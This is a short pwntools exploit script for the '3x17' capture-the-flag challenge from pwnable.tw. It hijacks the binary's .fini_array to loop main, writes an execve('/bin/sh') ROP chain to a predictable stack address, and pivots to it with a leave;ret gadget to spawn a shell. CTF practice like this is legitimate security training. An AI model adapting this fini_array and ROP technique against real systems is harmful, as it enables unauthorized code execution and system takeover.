#!/bin/python3
from pwn import *
# context(arch="amd64", os="linux", log_level="debug")
r = process("./3x17e")
# r = remote("chall.pwnable.tw", 10105)
# gdb.attach(r, "")


FINI_ARR = 0x4b40f0
FINI_FUNC = 0x402960 # the function that calls .fini_array
MAIN = 0x401b6d
# in .libc_csu_fini
RSP = 0x4b4100
LEAVE_RET = 0x401c4b # pop rsp; ret

def write_to_addr(addr: int, data: bytes):
    # written address
    r.recvuntil(b'addr:')
    r.send(str(addr).encode('utf-8'))

    # fill data
    r.recvuntil(b'data:')
    r.send(data)
def gdbs():
    context.terminal = ["foot"]
    gdb.attach(r,"""
    b*0x402988
               """)
write_to_addr(FINI_ARR, p64(FINI_FUNC) + p64(MAIN))
# write the first ROP addres to $RSP, which can be predicted in the end of ".fini_array"
write_to_addr(RSP, p64(0x41e4af)) # pop rax; ret
write_to_addr(RSP+8, p64(59)) # rax = 59

write_to_addr(RSP+16, p64(0x401696)) # pop rdi; ret
write_to_addr(RSP+24, p64(RSP+72)) # rdi = *pathname

write_to_addr(RSP+32, p64(0x406c30)) # pop rsi; ret
write_to_addr(RSP+40, p64(RSP+80))

write_to_addr(RSP+48, p64(0x446e35)) # pop rdx; ret
write_to_addr(RSP+56, p64(RSP+80))
write_to_addr(RSP+64, p64(0x4022b4)) # syscall
# variables
write_to_addr(RSP+72, p64(0x0068732f6e69622f)) #/bin/sh
write_to_addr(RSP+80, p64(0)) #0


# write to leave_ret
gdbs()
write_to_addr(FINI_ARR, p64(LEAVE_RET))

r.interactive()
